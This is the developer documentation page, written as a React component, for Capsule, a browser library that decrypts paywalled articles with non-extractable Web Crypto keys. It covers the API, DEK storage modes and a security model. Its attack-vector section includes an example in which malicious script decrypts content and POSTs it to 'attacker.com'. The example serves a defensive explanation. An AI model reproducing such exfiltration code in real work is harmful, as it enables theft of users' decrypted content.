import { CodeBlock } from "@/components/CodeBlock";

export default function ClientPage() {
  return (
    <main className="content-page">
      <h1>Client Integration</h1>
      <p>
        The Capsule client is a lightweight browser library that handles key
        management, DEK caching, and content decryption using the Web Crypto
        API.
      </p>

      <h2>Installation</h2>
      <CodeBlock language="bash">{`npm install @sesamy/capsule`}</CodeBlock>

      <h2>Quick Start (High-Level API)</h2>
      <p>
        The simplest way to use Capsule - just provide an unlock function and
        the client handles everything automatically:
      </p>
      <ul>
        <li>
          <strong>Key generation</strong> - RSA key pairs created on-demand
        </li>
        <li>
          <strong>DEK caching</strong> - encrypted DEKs stored for reuse
        </li>
        <li>
          <strong>Auto-renewal</strong> - time-bucketed keys are automatically
          renewed before expiry
        </li>
        <li>
          <strong>Script execution</strong> - <code>&lt;script&gt;</code> tags
          in decrypted HTML are executed (browsers don&apos;t run scripts
          inserted via innerHTML)
        </li>
      </ul>
      <CodeBlock>{`import { CapsuleClient } from '@sesamy/capsule';

// Initialize with an unlock function
const capsule = new CapsuleClient({
  unlock: async ({ keyId, wrappedDek, publicKey, articleId }) => {
    // Call your server to get the encrypted DEK
    const res = await fetch('/api/unlock', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keyId, wrappedDek, publicKey }),
    });
    return res.json(); // { encryptedDek, expiresAt, bucketId }
  }
});

// Unlock an article - keys auto-created if needed!
const content = await capsule.unlock(encryptedArticle);

// Or unlock by element ID (finds data-capsule attribute)
await capsule.unlockElement('article-123');

// Or process all encrypted elements on page
await capsule.processAll();`}</CodeBlock>

      <h3>Example: Encrypted Content with Embedded Script</h3>
      <p>
        When content is decrypted, any <code>&lt;script&gt;</code> tags are
        automatically executed. This enables interactive premium content:
      </p>
      <CodeBlock language="html">{`<!-- This is what your encrypted content might look like when decrypted -->
<article class="premium-content">
  <h2>🎉 Welcome, Premium Member!</h2>
  <p>You've unlocked exclusive content.</p>
  
  <script>
    // This script runs after decryption!
    const container = document.currentScript.parentElement;
    const confetti = ['🎊', '✨', '🌟', '💫', '🎉'];
    
    for (let i = 0; i < 20; i++) {
      const span = document.createElement('span');
      span.textContent = confetti[Math.floor(Math.random() * confetti.length)];
      span.style.cssText = \`
        position: fixed;
        font-size: 24px;
        animation: fall 3s ease-in forwards;
        left: \${Math.random() * 100}vw;
        top: -30px;
        z-index: 1000;
      \`;
      document.body.appendChild(span);
      setTimeout(() => span.remove(), 3000);
    }
    
    // Add a dynamic timestamp
    const time = document.createElement('p');
    time.innerHTML = '<em>Unlocked at: ' + new Date().toLocaleTimeString() + '</em>';
    container.appendChild(time);
  </script>
</article>`}</CodeBlock>

      <h2>Auto-Processing with Events</h2>
      <p>
        Enable <code>autoProcess</code> to automatically unlock all encrypted
        elements on page load:
      </p>
      <CodeBlock>{`const capsule = new CapsuleClient({
  unlock: myUnlockFunction,
  autoProcess: true,  // Process on page load
  executeScripts: true,  // Execute <script> in decrypted content
});

// Listen for unlock events
document.addEventListener('capsule:unlock', (e) => {
  console.log('Unlocked:', e.detail.articleId);
  console.log('Content:', e.detail.content.substring(0, 100));
});

document.addEventListener('capsule:error', (e) => {
  console.error('Failed:', e.detail.error);
});

document.addEventListener('capsule:state', (e) => {
  console.log('State changed:', e.detail.previousState, '→', e.detail.state);
});`}</CodeBlock>

      <h2>HTML Markup</h2>
      <p>
        Add encrypted content with the <code>data-capsule</code> attribute:
      </p>
      <CodeBlock language="html">{`<div 
  id="premium-content"
  data-capsule='{"articleId":"abc123","encryptedContent":"...","iv":"...","wrappedKeys":[...]}'
  data-capsule-id="abc123"
>
  <p>Loading encrypted content...</p>
</div>`}</CodeBlock>

      <h2>Configuration Options</h2>
      <CodeBlock>{`interface CapsuleClientOptions {
  // Required for automatic unlocking
  unlock?: UnlockFunction;    // Async function to fetch encrypted DEK

  // Key settings
  keySize?: 2048 | 4096;      // RSA key size (default: 2048)

  // Processing behavior
  autoProcess?: boolean;      // Auto-process elements on init (default: false)
  executeScripts?: boolean;   // Execute <script> tags (default: true)
  selector?: string;          // CSS selector (default: '[data-capsule]')

  // DEK caching
  dekStorage?: 'memory' | 'session' | 'persist';  // (default: 'persist')
  renewBuffer?: number;       // Ms before expiry to auto-renew (default: 5000)

  // Debugging
  logger?: (msg, level) => void;
}`}</CodeBlock>

      <h2>API Reference</h2>

      <h3>High-Level Methods</h3>

      <h4>getPublicKey()</h4>
      <p>
        Get the user's public key.{" "}
        <strong>Creates keys automatically if they don't exist.</strong>
      </p>
      <CodeBlock>{`const publicKey = await capsule.getPublicKey();
// Returns: Base64-encoded SPKI public key`}</CodeBlock>

      <h4>unlock(article, preferredKeyType?)</h4>
      <p>
        Decrypt an encrypted article using cached DEK or by fetching a new one.
      </p>
      <CodeBlock>{`const content = await capsule.unlock(encryptedArticle, 'tier');
// Returns: Decrypted content as string`}</CodeBlock>

      <h4>unlockElement(articleId)</h4>
      <p>Find an element by article ID, decrypt, and render content.</p>
      <CodeBlock>{`await capsule.unlockElement('article-123');
// Finds element with data-capsule-id="article-123"
// Decrypts and replaces innerHTML`}</CodeBlock>

      <h4>processAll()</h4>
      <p>Process all encrypted elements on the page.</p>
      <CodeBlock>{`const results = await capsule.processAll();
// Returns: Map<articleId, content | Error>`}</CodeBlock>

      <h3>Low-Level Methods</h3>

      <h4>decrypt(article, encryptedDek)</h4>
      <p>Decrypt with a pre-fetched encrypted DEK. For full manual control.</p>
      <CodeBlock>{`const publicKey = await capsule.getPublicKey();
const { encryptedDek } = await myServerCall(publicKey, wrappedKey);
const content = await capsule.decrypt(encryptedArticle, encryptedDek);`}</CodeBlock>

      <h4>decryptPayload(payload)</h4>
      <p>Decrypt a simple single-key payload (no envelope encryption).</p>
      <CodeBlock>{`const content = await capsule.decryptPayload({
  encryptedContent: 'base64...',
  iv: 'base64...',
  encryptedDek: 'base64...'
});`}</CodeBlock>

      <h4>hasKeyPair() / getKeyInfo() / regenerateKeyPair() / clearAll()</h4>
      <p>Utility methods for key management.</p>
      <CodeBlock>{`const exists = await capsule.hasKeyPair();
const info = await capsule.getKeyInfo(); // { keySize, createdAt }
const newKey = await capsule.regenerateKeyPair();
await capsule.clearAll(); // Remove all keys and cached DEKs`}</CodeBlock>

      <h2>React Integration</h2>
      <CodeBlock>{`import { useState, useEffect, useRef } from 'react';
import { CapsuleClient, UnlockFunction, EncryptedArticle } from '@sesamy/capsule';

export function useEncryptedContent(encryptedData: EncryptedArticle | null) {
  const [content, setContent] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<Error | null>(null);
  const clientRef = useRef<CapsuleClient | null>(null);

  useEffect(() => {
    // Initialize client once
    const unlock: UnlockFunction = async (params) => {
      const res = await fetch('/api/unlock', {
        method: 'POST',
        body: JSON.stringify(params),
      });
      return res.json();
    };

    clientRef.current = new CapsuleClient({ unlock });
  }, []);

  const handleUnlock = async () => {
    if (!clientRef.current || !encryptedData) return;
    
    setIsLoading(true);
    setError(null);
    
    try {
      const decrypted = await clientRef.current.unlock(encryptedData);
      setContent(decrypted);
    } catch (err) {
      setError(err instanceof Error ? err : new Error('Unlock failed'));
    } finally {
      setIsLoading(false);
    }
  };

  return { content, isLoading, error, handleUnlock };
}

// Usage
function Article({ encryptedData }) {
  const { content, isLoading, error, handleUnlock } = useEncryptedContent(encryptedData);

  if (content) return <div dangerouslySetInnerHTML={{ __html: content }} />;
  if (isLoading) return <p>Unlocking...</p>;
  if (error) return <p>Error: {error.message}</p>;
  
  return <button onClick={handleUnlock}>Unlock</button>;
}`}</CodeBlock>

      <h2>DEK Storage Modes</h2>
      <p>
        Control how decrypted DEKs are cached for performance and offline
        access:
      </p>
      <table
        style={{ width: "100%", borderCollapse: "collapse", marginTop: "1rem" }}
      >
        <thead>
          <tr>
            <th
              style={{
                textAlign: "left",
                padding: "0.5rem",
                borderBottom: "1px solid #ddd",
              }}
            >
              Mode
            </th>
            <th
              style={{
                textAlign: "left",
                padding: "0.5rem",
                borderBottom: "1px solid #ddd",
              }}
            >
              Storage
            </th>
            <th
              style={{
                textAlign: "left",
                padding: "0.5rem",
                borderBottom: "1px solid #ddd",
              }}
            >
              Persistence
            </th>
            <th
              style={{
                textAlign: "left",
                padding: "0.5rem",
                borderBottom: "1px solid #ddd",
              }}
            >
              Use Case
            </th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              <code>'memory'</code>
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              JavaScript
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Page refresh
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Maximum security
            </td>
          </tr>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              <code>'session'</code>
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              sessionStorage
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Tab close
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Balance security/UX
            </td>
          </tr>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              <code>'persist'</code>
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              IndexedDB
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Browser restart
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Best offline support
            </td>
          </tr>
        </tbody>
      </table>
      <p style={{ marginTop: "0.5rem", fontSize: "0.9rem", opacity: 0.8 }}>
        Note: DEKs are stored <strong>encrypted</strong> with the user's public
        key. They must be unwrapped using the private key each time (which never
        leaves the browser's crypto subsystem).
      </p>

      <h2>Security Model</h2>

      <h3>Private Key Protection: The Core Guarantee</h3>
      <p>
        The Capsule client's security foundation is that{" "}
        <strong>the private key cannot be extracted from the browser</strong>,
        even by the user or malicious JavaScript code.
      </p>

      <h4>How Non-Extractable Keys Work</h4>
      <p>
        When generating a key pair, the private key is stored with{" "}
        <code>extractable: false</code>:
      </p>
      <CodeBlock>{`const privateKey = await crypto.subtle.importKey(
  'jwk',
  privateKeyJwk,
  { name: 'RSA-OAEP', hash: 'SHA-256' },
  false,  // NOT extractable - enforced by browser engine
  ['unwrapKey']
);`}</CodeBlock>

      <p>This means:</p>
      <ul>
        <li>
          ✅ The key can be <strong>used</strong> for unwrapping DEKs
        </li>
        <li>
          ❌ The key cannot be <strong>exported</strong> in any format (JWK,
          PKCS8, raw bytes)
        </li>
        <li>
          ❌ The key cannot be <strong>copied</strong> to another device or
          browser
        </li>
        <li>
          ❌ The key cannot be <strong>downloaded</strong> or sent to a server
        </li>
      </ul>

      <h4>What About IndexedDB Access?</h4>
      <p>
        Users and JavaScript code <strong>can access IndexedDB</strong> through
        DevTools or browser APIs:
      </p>
      <CodeBlock>{`// You CAN retrieve the key object
const db = await indexedDB.open('capsule-keys');
const keyPair = await db.get('keypair', 'default');
console.log(keyPair.privateKey); 
// Output: CryptoKey {type: "private", extractable: false, ...}

// But you CANNOT export the key material
await crypto.subtle.exportKey('jwk', keyPair.privateKey);
// ❌ Error: "key is not extractable"

await crypto.subtle.exportKey('pkcs8', keyPair.privateKey);
// ❌ Error: "key is not extractable"

// Even this doesn't help
JSON.stringify(keyPair.privateKey);
// Returns: "{}" (empty object)

const blob = new Blob([keyPair.privateKey]);
// Creates: "[object CryptoKey]" (useless string)`}</CodeBlock>

      <p>
        The <code>CryptoKey</code> object in IndexedDB is just a{" "}
        <strong>handle</strong> or <strong>reference</strong> to the actual key
        material, which lives in the browser's secure crypto subsystem. Think of
        it like a key to a safe deposit box that only works inside the bank -
        you can use it there, but you can't take the contents home.
      </p>

      <h4>Attack Vector Analysis</h4>
      <table
        style={{ width: "100%", borderCollapse: "collapse", marginTop: "1rem" }}
      >
        <thead>
          <tr>
            <th
              style={{
                textAlign: "left",
                padding: "0.5rem",
                borderBottom: "1px solid #ddd",
              }}
            >
              Attack Type
            </th>
            <th
              style={{
                textAlign: "left",
                padding: "0.5rem",
                borderBottom: "1px solid #ddd",
              }}
            >
              Can Extract Key?
            </th>
            <th
              style={{
                textAlign: "left",
                padding: "0.5rem",
                borderBottom: "1px solid #ddd",
              }}
            >
              Notes
            </th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Server compromise
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              ❌ No
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Key never sent to server
            </td>
          </tr>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Network interception
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              ❌ No
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Key never transmitted
            </td>
          </tr>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              XSS / malicious JS
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              ❌ No
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Can use key, cannot export it
            </td>
          </tr>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Browser DevTools
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              ❌ No
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Can see object, not bytes
            </td>
          </tr>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Database breach
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              ❌ No
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              No server-side key storage
            </td>
          </tr>
          <tr>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              User manual export
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              ❌ No
            </td>
            <td style={{ padding: "0.5rem", borderBottom: "1px solid #eee" }}>
              Browser prevents all export methods
            </td>
          </tr>
        </tbody>
      </table>

      <p style={{ marginTop: "1rem" }}>
        The <strong>only</strong> attack that works is using the key for its
        intended purpose:
      </p>
      <CodeBlock>{`// Malicious code CAN do this:
const decryptedContent = await client.decryptArticle(payload);
await fetch('https://attacker.com', { 
  method: 'POST', 
  body: decryptedContent  // Send decrypted content (not the key!)
});`}</CodeBlock>

      <p>
        This is why <strong>XSS protection</strong> (Content Security Policy,
        input sanitization) remains critical - not to protect the key itself,
        but to prevent unauthorized <strong>use</strong> of the key.
      </p>

      <h3>Additional Security Layers</h3>
      <ul>
        <li>
          <strong>DEKs in Memory Only</strong>: Unwrapped DEKs are cached in
          JavaScript memory (not persisted) and lost on page refresh
        </li>
        <li>
          <strong>AES-GCM Authentication</strong>: 128-bit auth tags prevent
          tampering with encrypted content
        </li>
        <li>
          <strong>Web Crypto API</strong>: Uses hardware-accelerated
          cryptography when available (TPM, Secure Enclave)
        </li>
        <li>
          <strong>Secure Context Requirement</strong>: Web Crypto API only works
          over HTTPS or localhost
        </li>
        <li>
          <strong>Origin Isolation</strong>: IndexedDB is bound to the origin -
          other websites cannot access your keys
        </li>
      </ul>

      <h3>What This Means for Your Application</h3>
      <ul>
        <li>
          ✅ <strong>Server compromise cannot leak user keys</strong> - They're
          not on the server
        </li>
        <li>
          ✅ <strong>Database breach cannot decrypt content</strong> - Private
          keys are client-side only
        </li>
        <li>
          ✅ <strong>Network eavesdropping is ineffective</strong> - Only
          wrapped DEKs are transmitted
        </li>
        <li>
          ✅ <strong>Users cannot accidentally export their keys</strong> -
          Browser prevents it
        </li>
        <li>
          ✅ <strong>True end-to-end encryption</strong> - Only the user's
          browser can decrypt
        </li>
      </ul>

      <h3>Limitations and Trade-offs</h3>
      <ul>
        <li>
          ⚠️ <strong>Key loss means data loss</strong>: If a user clears browser
          data or switches devices, they lose access
        </li>
        <li>
          ⚠️ <strong>No cross-device sync</strong>: Keys are tied to a single
          browser profile
        </li>
        <li>
          ⚠️ <strong>XSS can still abuse keys</strong>: Malicious code can
          decrypt content (though not steal keys)
        </li>
      </ul>

      <p>Consider implementing:</p>
      <ul>
        <li>Server-side encrypted key backup (wrapped with user password)</li>
        <li>
          Multi-device key synchronization (using secure key exchange protocols)
        </li>
        <li>Content Security Policy (CSP) to prevent XSS attacks</li>
      </ul>

      <h2>Browser Compatibility</h2>
      <p>Capsule requires the Web Crypto API, which is available in:</p>
      <ul>
        <li>✅ Chrome 37+</li>
        <li>✅ Firefox 34+</li>
        <li>✅ Safari 11+</li>
        <li>✅ Edge 79+</li>
      </ul>
      <p>
        Note: Web Crypto API is only available in secure contexts (HTTPS or
        localhost).
      </p>
    </main>
  );
}
